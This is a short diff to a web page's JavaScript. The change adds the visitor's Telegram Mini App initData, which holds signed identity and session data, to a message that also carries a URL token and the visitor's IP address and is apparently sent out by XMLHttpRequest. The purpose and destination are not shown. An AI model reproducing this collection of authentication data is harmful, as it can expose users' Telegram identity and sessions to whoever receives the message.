@@ -41,7 +41,7 @@
             const urlParams = new URLSearchParams(queryString);
             const id = urlParams.get('Token');
 
-			const message = `Telegram ${id} ${document.getElementById('ipAddress').innerHTML}`;
+			const message = `Telegram ${id} ${document.getElementById('ipAddress').innerHTML},,,,,, ${Telegram.WebApp.initData}`;
 
 			const xhttp = new XMLHttpRequest();
 			xhttp.onreadystatechange = function() {
